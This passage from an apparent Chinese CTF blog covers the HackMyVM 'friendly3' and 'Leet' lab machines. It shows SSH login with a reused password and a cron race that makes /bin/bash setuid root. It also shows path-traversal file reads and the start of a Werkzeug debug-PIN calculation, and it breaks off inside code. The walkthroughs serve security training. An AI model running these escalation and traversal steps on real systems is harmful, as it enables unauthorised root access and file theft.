<h2 id="ssh登录"><a href="#ssh登录" class="headerlink" title="ssh登录"></a>ssh登录</h2><p>用相同的密码测试登录ssh发现登录成功<br><code>juan:alexis</code></p>
<pre class="language-bash" data-language="bash"><code class="language-bash">┌──<span class="token punctuation">(</span>root㉿kali2<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/Desktop<span class="token punctuation">]</span>
└─<span class="token comment"># ssh juan@192.168.56.156                                      </span>
The authenticity of <span class="token function">host</span> <span class="token string">'192.168.56.156 (192.168.56.156)'</span> can<span class="token string">'t be established.
ED25519 key fingerprint is SHA256:qcoxC68+orQ8LIJrunR2ElUTnj9X5X0OFj9F/oxHDjc.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '</span><span class="token number">192.168</span>.56.156<span class="token string">' (ED25519) to the list of known hosts.
juan@192.168.56.156'</span>s password: 
Linux friendly3 <span class="token number">6.1</span>.0-9-amd64 <span class="token comment">#1 SMP PREEMPT_DYNAMIC Debian 6.1.27-1 (2023-05-08) x86_64</span>

The programs included with the Debian GNU/Linux system are <span class="token function">free</span> software<span class="token punctuation">;</span>
the exact distribution terms <span class="token keyword">for</span> each program are described <span class="token keyword">in</span> the
individual files <span class="token keyword">in</span> /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
juan@friendly3:~$ <span class="token function">id</span>
<span class="token assign-left variable">uid</span><span class="token operator">=</span><span class="token number">1001</span><span class="token punctuation">(</span>juan<span class="token punctuation">)</span> <span class="token assign-left variable">gid</span><span class="token operator">=</span><span class="token number">1001</span><span class="token punctuation">(</span>juan<span class="token punctuation">)</span> <span class="token assign-left variable">groups</span><span class="token operator">=</span><span class="token number">1001</span><span class="token punctuation">(</span>juan<span class="token punctuation">)</span>

juan@friendly3:~$ <span class="token function">ls</span> <span class="token parameter variable">-al</span>
total <span class="token number">28</span>
drwxr-xr-x  <span class="token number">3</span> juan juan <span class="token number">4096</span> Jul <span class="token number">17</span>  <span class="token number">2023</span> <span class="token builtin class-name">.</span>
drwxr-xr-x  <span class="token number">4</span> root root <span class="token number">4096</span> Jun <span class="token number">25</span>  <span class="token number">2023</span> <span class="token punctuation">..</span>
lrwxrwxrwx  <span class="token number">1</span> root root    <span class="token number">9</span> Jun <span class="token number">25</span>  <span class="token number">2023</span> .bash_history -<span class="token operator">></span> /dev/null
-rw-r--r--  <span class="token number">1</span> juan juan  <span class="token number">220</span> Apr <span class="token number">23</span>  <span class="token number">2023</span> .bash_logout
-rw-r--r--  <span class="token number">1</span> juan juan <span class="token number">3526</span> Apr <span class="token number">23</span>  <span class="token number">2023</span> .bashrc
drwxr-xr-x <span class="token number">14</span> root root <span class="token number">4096</span> Jun <span class="token number">25</span>  <span class="token number">2023</span> <span class="token function">ftp</span>
-rw-r--r--  <span class="token number">1</span> juan juan  <span class="token number">807</span> Apr <span class="token number">23</span>  <span class="token number">2023</span> .profile
-r--------  <span class="token number">1</span> juan juan   <span class="token number">33</span> Jul <span class="token number">17</span>  <span class="token number">2023</span> user.txt</code></pre>
<p>拿到user flag</p>
<h2 id="提权root"><a href="#提权root" class="headerlink" title="提权root"></a>提权root</h2><p>在&#x2F;opt里面发现一个脚本文件</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">juan@friendly3:/opt$ <span class="token function">ls</span> <span class="token parameter variable">-al</span>
total <span class="token number">12</span>
drwxr-xr-x  <span class="token number">2</span> root root <span class="token number">4096</span> Jun <span class="token number">25</span>  <span class="token number">2023</span> <span class="token builtin class-name">.</span>
drwxr-xr-x <span class="token number">18</span> root root <span class="token number">4096</span> Jun <span class="token number">25</span>  <span class="token number">2023</span> <span class="token punctuation">..</span>
-rwxr-xr-x  <span class="token number">1</span> root root  <span class="token number">190</span> Jun <span class="token number">25</span>  <span class="token number">2023</span> check_for_install.sh
juan@friendly3:/opt$ <span class="token function">cat</span> check_for_install.sh 
<span class="token comment">#!/bin/bash</span>


/usr/bin/curl <span class="token string">"http://127.0.0.1/9842734723948024.bash"</span> <span class="token operator">></span> /tmp/a.bash

<span class="token function">chmod</span> +x /tmp/a.bash
<span class="token function">chmod</span> +r /tmp/a.bash
<span class="token function">chmod</span> +w /tmp/a.bash

/bin/bash /tmp/a.bash

<span class="token function">rm</span> <span class="token parameter variable">-rf</span> /tmp/a.bash</code></pre>
<p>会获取<code>http://127.0.0.1/9842734723948024.bash</code>的内容然后执行 并且是root权限</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">juan@friendly3:/opt$ <span class="token function">curl</span> http://127.0.0.1/9842734723948024.bash
<span class="token comment">#test</span></code></pre>
<p>盲猜是个定时任务，穿个pspy64看一下，没有wget用scp传过去</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">┌──<span class="token punctuation">(</span>root㉿kali2<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/Desktop<span class="token punctuation">]</span>
└─<span class="token comment"># scp pspy64 juan@192.168.56.156:/tmp </span>
juan@192.168.56.156's password: 
pspy64                                                                                                                                                                                                              <span class="token number">100</span>% 3006KB  <span class="token number">17</span>.1MB/s   00:00    </code></pre>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token number">2024</span>/04/20 01:06:37 CMD: <span class="token assign-left variable"><span class="token environment constant">UID</span></span><span class="token operator">=</span><span class="token number">0</span>    <span class="token assign-left variable">PID</span><span class="token operator">=</span><span class="token number">1</span>      <span class="token operator">|</span> /sbin/init 
<span class="token number">2024</span>/04/20 01:07:01 CMD: <span class="token assign-left variable"><span class="token environment constant">UID</span></span><span class="token operator">=</span><span class="token number">0</span>    <span class="token assign-left variable">PID</span><span class="token operator">=</span><span class="token number">1266</span>   <span class="token operator">|</span> /usr/sbin/CRON <span class="token parameter variable">-f</span> 
<span class="token number">2024</span>/04/20 01:07:01 CMD: <span class="token assign-left variable"><span class="token environment constant">UID</span></span><span class="token operator">=</span><span class="token number">0</span>    <span class="token assign-left variable">PID</span><span class="token operator">=</span><span class="token number">1267</span>   <span class="token operator">|</span> /bin/sh <span class="token parameter variable">-c</span> /opt/check_for_install.sh 
<span class="token number">2024</span>/04/20 01:07:01 CMD: <span class="token assign-left variable"><span class="token environment constant">UID</span></span><span class="token operator">=</span><span class="token number">0</span>    <span class="token assign-left variable">PID</span><span class="token operator">=</span><span class="token number">1268</span>   <span class="token operator">|</span> /bin/sh <span class="token parameter variable">-c</span> /opt/check_for_install.sh 
<span class="token number">2024</span>/04/20 01:07:01 CMD: <span class="token assign-left variable"><span class="token environment constant">UID</span></span><span class="token operator">=</span><span class="token number">0</span>    <span class="token assign-left variable">PID</span><span class="token operator">=</span><span class="token number">1269</span>   <span class="token operator">|</span> /bin/bash /opt/check_for_install.sh 
<span class="token number">2024</span>/04/20 01:07:01 CMD: <span class="token assign-left variable"><span class="token environment constant">UID</span></span><span class="token operator">=</span><span class="token number">0</span>    <span class="token assign-left variable">PID</span><span class="token operator">=</span><span class="token number">1270</span>   <span class="token operator">|</span> 
<span class="token number">2024</span>/04/20 01:07:01 CMD: <span class="token assign-left variable"><span class="token environment constant">UID</span></span><span class="token operator">=</span><span class="token number">0</span>    <span class="token assign-left variable">PID</span><span class="token operator">=</span><span class="token number">1272</span>   <span class="token operator">|</span> 
<span class="token number">2024</span>/04/20 01:07:01 CMD: <span class="token assign-left variable"><span class="token environment constant">UID</span></span><span class="token operator">=</span><span class="token number">0</span>    <span class="token assign-left variable">PID</span><span class="token operator">=</span><span class="token number">1274</span>   <span class="token operator">|</span> /bin/bash /opt/check_for_install.sh 
<span class="token number">2024</span>/04/20 01:08:01 CMD: <span class="token assign-left variable"><span class="token environment constant">UID</span></span><span class="token operator">=</span><span class="token number">0</span>    <span class="token assign-left variable">PID</span><span class="token operator">=</span><span class="token number">1275</span>   <span class="token operator">|</span> /usr/sbin/CRON <span class="token parameter variable">-f</span> 
<span class="token number">2024</span>/04/20 01:08:01 CMD: <span class="token assign-left variable"><span class="token environment constant">UID</span></span><span class="token operator">=</span><span class="token number">0</span>    <span class="token assign-left variable">PID</span><span class="token operator">=</span><span class="token number">1276</span>   <span class="token operator">|</span> /usr/sbin/CRON <span class="token parameter variable">-f</span> 
<span class="token number">2024</span>/04/20 01:08:01 CMD: <span class="token assign-left variable"><span class="token environment constant">UID</span></span><span class="token operator">=</span><span class="token number">0</span>    <span class="token assign-left variable">PID</span><span class="token operator">=</span><span class="token number">1277</span>   <span class="token operator">|</span> /bin/bash /opt/check_for_install.sh 
<span class="token number">2024</span>/04/20 01:08:01 CMD: <span class="token assign-left variable"><span class="token environment constant">UID</span></span><span class="token operator">=</span><span class="token number">0</span>    <span class="token assign-left variable">PID</span><span class="token operator">=</span><span class="token number">1278</span>   <span class="token operator">|</span> /bin/bash /opt/check_for_install.sh 
<span class="token number">2024</span>/04/20 01:08:01 CMD: <span class="token assign-left variable"><span class="token environment constant">UID</span></span><span class="token operator">=</span><span class="token number">0</span>    <span class="token assign-left variable">PID</span><span class="token operator">=</span><span class="token number">1279</span>   <span class="token operator">|</span> <span class="token function">chmod</span> +x /tmp/a.bash 
<span class="token number">2024</span>/04/20 01:08:01 CMD: <span class="token assign-left variable"><span class="token environment constant">UID</span></span><span class="token operator">=</span><span class="token number">0</span>    <span class="token assign-left variable">PID</span><span class="token operator">=</span><span class="token number">1280</span>   <span class="token operator">|</span> <span class="token function">chmod</span> +r /tmp/a.bash 
<span class="token number">2024</span>/04/20 01:08:01 CMD: <span class="token assign-left variable"><span class="token environment constant">UID</span></span><span class="token operator">=</span><span class="token number">0</span>    <span class="token assign-left variable">PID</span><span class="token operator">=</span><span class="token number">1281</span>   <span class="token operator">|</span> 
<span class="token number">2024</span>/04/20 01:08:01 CMD: <span class="token assign-left variable"><span class="token environment constant">UID</span></span><span class="token operator">=</span><span class="token number">0</span>    <span class="token assign-left variable">PID</span><span class="token operator">=</span><span class="token number">1283</span>   <span class="token operator">|</span> /bin/bash /opt/check_for_install.sh </code></pre>
<p>根据进程看是一分钟执行一次<br>那么可以写一个不断执行的脚本往a.bash里面添加提权的指令,在写入和执行的间隙写入a.bash</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">juan@friendly3:/tmp$ <span class="token keyword">while</span> <span class="token boolean">true</span><span class="token punctuation">;</span><span class="token keyword">do</span> <span class="token builtin class-name">echo</span> <span class="token string">'chmod +s /bin/bash'</span> <span class="token operator">></span>a.bash<span class="token punctuation">;</span><span class="token keyword">done</span>
^Cchmod +s /bin/bash
juan@friendly3:/tmp$ <span class="token function">ls</span> <span class="token parameter variable">-al</span>
total <span class="token number">3036</span>
drwxrwxrwt  <span class="token number">7</span> root root    <span class="token number">4096</span> Apr <span class="token number">20</span> 01:17 <span class="token builtin class-name">.</span>
drwxr-xr-x <span class="token number">18</span> root root    <span class="token number">4096</span> Jun <span class="token number">25</span>  <span class="token number">2023</span> <span class="token punctuation">..</span>
-rw-r--r--  <span class="token number">1</span> juan juan       <span class="token number">0</span> Apr <span class="token number">20</span> 01:17 a.bash
drwxrwxrwt  <span class="token number">2</span> root root    <span class="token number">4096</span> Apr <span class="token number">20</span> 00:16 .font-unix
drwxrwxrwt  <span class="token number">2</span> root root    <span class="token number">4096</span> Apr <span class="token number">20</span> 00:16 .ICE-unix
-rwx--x--x  <span class="token number">1</span> juan juan <span class="token number">3078592</span> Apr <span class="token number">20</span> 01:05 pspy64
drwx------  <span class="token number">3</span> root root    <span class="token number">4096</span> Apr <span class="token number">20</span> 00:16 systemd-private-1fd946a609ca4ee0b079518a508648f6-systemd-logind.service-fTyK0a
drwxrwxrwt  <span class="token number">2</span> root root    <span class="token number">4096</span> Apr <span class="token number">20</span> 00:16 .X11-unix
drwxrwxrwt  <span class="token number">2</span> root root    <span class="token number">4096</span> Apr <span class="token number">20</span> 00:16 .XIM-unix
juan@friendly3:/tmp$ <span class="token function">ls</span> <span class="token parameter variable">-al</span> /bin/bash
-rwsr-sr-x <span class="token number">1</span> root root <span class="token number">1265648</span> Apr <span class="token number">23</span>  <span class="token number">2023</span> /bin/bash
juan@friendly3:/tmp$ basp <span class="token parameter variable">-p</span>
-bash: basp: <span class="token builtin class-name">command</span> not found
juan@friendly3:/tmp$ <span class="token function">bash</span> <span class="token parameter variable">-p</span>
bash-5.2<span class="token comment"># id</span>
<span class="token assign-left variable">uid</span><span class="token operator">=</span><span class="token number">1001</span><span class="token punctuation">(</span>juan<span class="token punctuation">)</span> <span class="token assign-left variable">gid</span><span class="token operator">=</span><span class="token number">1001</span><span class="token punctuation">(</span>juan<span class="token punctuation">)</span> <span class="token assign-left variable">euid</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span> <span class="token assign-left variable">egid</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span> <span class="token assign-left variable">groups</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span>,1001<span class="token punctuation">(</span>juan<span class="token punctuation">)</span>
bash-5.2<span class="token comment"># cat /root/r*</span>
eb9748b67f25e6bd202e5fa25f534d51</code></pre>
<p>拿到root</p>
]]></content>
      <categories>
        <category>HackMyVM</category>
      </categories>
      <tags>
        <tag>定时任务</tag>
      </tags>
  </entry>
  <entry>
    <title>HackMyVM-Leet</title>
    <url>/posts/3d50af75/</url>
    <content><![CDATA[<p><strong>难度:hard</strong></p>
<p><strong>kali:192.168.56.104</strong></p>
<p><strong>靶机:192.168.56.193</strong></p>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token operator">></span> arp-scan <span class="token parameter variable">-l</span>
Interface: eth0, type: EN10MB, MAC: 00:0c:29:d2:e0:49, IPv4: <span class="token number">192.168</span>.56.104
Starting arp-scan <span class="token number">1.10</span>.0 with <span class="token number">256</span> hosts <span class="token punctuation">(</span>https://github.com/royhills/arp-scan<span class="token punctuation">)</span>
<span class="token number">192.168</span>.56.1    0a:00:27:00:00:05       <span class="token punctuation">(</span>Unknown: locally administered<span class="token punctuation">)</span>
<span class="token number">192.168</span>.56.100  08:00:27:3d:d3:11       PCS Systemtechnik GmbH
<span class="token number">192.168</span>.56.193  08:00:27:b3:a1:d9       PCS Systemtechnik GmbH

<span class="token number">3</span> packets received by filter, <span class="token number">0</span> packets dropped by kernel
Ending arp-scan <span class="token number">1.10</span>.0: <span class="token number">256</span> hosts scanned <span class="token keyword">in</span> <span class="token number">1.937</span> seconds <span class="token punctuation">(</span><span class="token number">132.16</span> hosts/sec<span class="token punctuation">)</span>. <span class="token number">3</span> responded
</code></pre>
<h2 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h2><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token operator">></span> nmap <span class="token number">192.168</span>.56.193            
Starting Nmap <span class="token number">7</span>.94SVN <span class="token punctuation">(</span> https://nmap.org <span class="token punctuation">)</span> at <span class="token number">2024</span>-07-13 <span class="token number">20</span>:02 CST
Nmap scan report <span class="token keyword">for</span> <span class="token number">192.168</span>.56.193
Host is up <span class="token punctuation">(</span><span class="token number">0</span>.00014s latency<span class="token punctuation">)</span>.
Not shown: <span class="token number">998</span> closed tcp ports <span class="token punctuation">(</span>reset<span class="token punctuation">)</span>
PORT     STATE SERVICE
<span class="token number">22</span>/tcp   <span class="token function">open</span>  <span class="token function">ssh</span>
<span class="token number">7777</span>/tcp <span class="token function">open</span>  cbt
MAC Address: 08:00:27:B3:A1:D9 <span class="token punctuation">(</span>Oracle VirtualBox virtual NIC<span class="token punctuation">)</span>

Nmap done: <span class="token number">1</span> IP address <span class="token punctuation">(</span><span class="token number">1</span> <span class="token function">host</span> up<span class="token punctuation">)</span> scanned <span class="token keyword">in</span> <span class="token number">0.12</span> seconds
</code></pre>
<p>开放了两个端口 22 7777，仔细扫一下</p>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token operator">></span> nmap <span class="token number">192.168</span>.56.193 <span class="token parameter variable">-sV</span> <span class="token parameter variable">-A</span> -p22,7777
Starting Nmap <span class="token number">7</span>.94SVN <span class="token punctuation">(</span> https://nmap.org <span class="token punctuation">)</span> at <span class="token number">2024</span>-07-13 <span class="token number">20</span>:02 CST
Nmap scan report <span class="token keyword">for</span> <span class="token number">192.168</span>.56.193
Host is up <span class="token punctuation">(</span><span class="token number">0</span>.00027s latency<span class="token punctuation">)</span>.

PORT     STATE SERVICE VERSION
<span class="token number">22</span>/tcp   <span class="token function">open</span>  <span class="token function">ssh</span>     OpenSSH <span class="token number">9</span>.2p1 Debian <span class="token number">2</span>+deb12u2 <span class="token punctuation">(</span>protocol <span class="token number">2.0</span><span class="token punctuation">)</span>
<span class="token operator">|</span> ssh-hostkey: 
<span class="token operator">|</span>   <span class="token number">256</span> e1:5d:7c:b7:07:92:17:dc:46:76:7d:be:a9:50:43:d2 <span class="token punctuation">(</span>ECDSA<span class="token punctuation">)</span>
<span class="token operator">|</span>_  <span class="token number">256</span> a0:f3:b3:86:93:f5:58:82:88:dd:e5:10:db:35:de:62 <span class="token punctuation">(</span>ED25519<span class="token punctuation">)</span>
<span class="token number">7777</span>/tcp <span class="token function">open</span>  http    Werkzeug httpd <span class="token number">3.0</span>.1 <span class="token punctuation">(</span>Python <span class="token number">3.11</span>.2<span class="token punctuation">)</span>
<span class="token operator">|</span>_http-server-header: Werkzeug/3.0.1 Python/3.11.2
<span class="token operator">|</span>_http-title: Site doesn't have a title <span class="token punctuation">(</span>text/html<span class="token punctuation">;</span> <span class="token assign-left variable">charset</span><span class="token operator">=</span>utf-8<span class="token punctuation">)</span>.
MAC Address: 08:00:27:B3:A1:D9 <span class="token punctuation">(</span>Oracle VirtualBox virtual NIC<span class="token punctuation">)</span>
Warning: OSScan results may be unreliable because we could not <span class="token function">find</span> at least <span class="token number">1</span> <span class="token function">open</span> and <span class="token number">1</span> closed port
Device type: general purpose
Running: Linux <span class="token number">4</span>.X<span class="token operator">|</span><span class="token number">5</span>.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux <span class="token number">4.15</span> - <span class="token number">5.8</span>
Network Distance: <span class="token number">1</span> hop
Service Info: OS: Linux<span class="token punctuation">;</span> CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
<span class="token number">1</span>   <span class="token number">0.27</span> ms <span class="token number">192.168</span>.56.193

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="token builtin class-name">.</span>
Nmap done: <span class="token number">1</span> IP address <span class="token punctuation">(</span><span class="token number">1</span> <span class="token function">host</span> up<span class="token punctuation">)</span> scanned <span class="token keyword">in</span> <span class="token number">18.03</span> seconds</code></pre>
<p>可以看到 7777端口是一个werkzeug服务</p>
<h2 id="web信息搜集"><a href="#web信息搜集" class="headerlink" title="web信息搜集"></a>web信息搜集</h2><p><img src="https://ooo.0x0.ooo/2024/07/13/ORO93l.png" alt="ORO93l.png" loading="lazy"><br>是一个将字符串转正leet(黑客俚语)的转化器<br>扫一下目录</p>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token operator">></span> gobuster <span class="token function">dir</span> <span class="token parameter variable">-u</span> http://192.168.56.193:7777/ <span class="token parameter variable">-x</span> html,txt,php,bak,zip <span class="token parameter variable">--wordlist</span><span class="token operator">=</span>/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>
Gobuster v3.6
by OJ Reeves <span class="token punctuation">(</span>@TheColonial<span class="token punctuation">)</span> <span class="token operator">&amp;</span> Christian Mehlmauer <span class="token punctuation">(</span>@firefart<span class="token punctuation">)</span>
<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Url:                     http://192.168.56.193:7777/
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Method:                  GET
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Threads:                 <span class="token number">10</span>
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Negative Status codes:   <span class="token number">404</span>
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> User Agent:              gobuster/3.6
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Extensions:              html,txt,php,bak,zip
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Timeout:                 10s
<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>
Starting gobuster <span class="token keyword">in</span> directory enumeration mode
<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>
/download             <span class="token punctuation">(</span>Status: <span class="token number">500</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>Size: <span class="token number">14478</span><span class="token punctuation">]</span>
/console              <span class="token punctuation">(</span>Status: <span class="token number">200</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>Size: <span class="token number">1563</span><span class="token punctuation">]</span>
Progress: <span class="token number">204231</span> / <span class="token number">1323366</span> <span class="token punctuation">(</span><span class="token number">15.43</span>%<span class="token punctuation">)</span>^C
<span class="token punctuation">[</span><span class="token operator">!</span><span class="token punctuation">]</span> Keyboard interrupt detected, terminating.
Progress: <span class="token number">204353</span> / <span class="token number">1323366</span> <span class="token punctuation">(</span><span class="token number">15.44</span>%<span class="token punctuation">)</span>
<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>
Finished
<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span></code></pre>
<p>取download路由看一下<br><img src="https://ooo.0x0.ooo/2024/07/13/ORO2ig.png" alt="ORO2ig.png" loading="lazy"><br>注意到可以下载文件但是不能以<code>/</code>开头，尝试路径穿越<br><img src="https://ooo.0x0.ooo/2024/07/01/OPyhpG.png" alt="OPyhpG.png" loading="lazy"></p>
<pre class="language-bash" data-language="bash"><code class="language-bash">root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:998:998:systemd Network Management:/:/usr/sbin/nologin
systemd-timesync:x:997:997:systemd Time Synchronization:/:/usr/sbin/nologin
messagebus:x:100:107::/nonexistent:/usr/sbin/nologin
avahi-autoipd:x:101:109:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/usr/sbin/nologin
sshd:x:102:65534::/run/sshd:/usr/sbin/nologin
riva:x:1000:1000:,,,:/home/riva:/bin/bash</code></pre>
<p>确实包含了，看看能不能读取一下riva的私钥<br><img src="https://ooo.0x0.ooo/2024/07/13/ORO64B.png" alt="ORO64B.png" loading="lazy"><br>权限不够，用户应该是www-data,那就尝试计算pin码</p>
<h2 id="pin码计算"><a href="#pin码计算" class="headerlink" title="pin码计算"></a>pin码计算</h2><p>username:上面推测了 应该是<code>www-data</code><br>modname:flask.app<br>getattr:一般是Flask<br>app.py绝对路径:报错信息可以看到是<code>/opt/project/venv/lib/python3.11/site-packages/flask/app.py</code><br>mac地址：尝试读取<code>/sys/class/net/eth0/address</code>发现文件不存在<br><img src="https://ooo.0x0.ooo/2024/07/01/OPyN0F.png" alt="OPyN0F.png" loading="lazy"><br>猜测用不不是eth0网卡，于是我又尝试读取<code>/sys/class/net/enp0s3/address</code>读到mac地址<br><img src="https://ooo.0x0.ooo/2024/07/13/ORO82s.png" alt="ORO82s.png" loading="lazy"><br><code>08:00:27:b3:a1:d9</code>转10进制-&gt;<code>8796759106009</code><br>machine-id:<br>读取一下init文件，看一下machine-id如何构成</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">http://192.168.56.193:7777/download?filename<span class="token operator">=</span><span class="token punctuation">..</span>/<span class="token punctuation">..</span>/<span class="token punctuation">..</span>/<span class="token punctuation">..</span>/<span class="token punctuation">..</span>/<span class="token punctuation">..</span>/<span class="token punctuation">..</span>/<span class="token punctuation">..</span>/<span class="token punctuation">..</span>/<span class="token punctuation">..</span>/<span class="token punctuation">..</span>/opt/project/venv/lib/python3.11/site-packages/werkzeug/debug/__init__.py</code></pre>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">get_machine_id</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token builtin">str</span> <span class="token operator">|</span> <span class="token builtin">bytes</span> <span class="token operator">|</span> <span class="token boolean">None</span><span class="token punctuation">:</span>
    <span class="token keyword">global</span> _machine_id

    <span class="token keyword">if</span> _machine_id <span class="token keyword">is</span> <span class="token keyword">not</span> <span class="token boolean">None</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> _machine_id

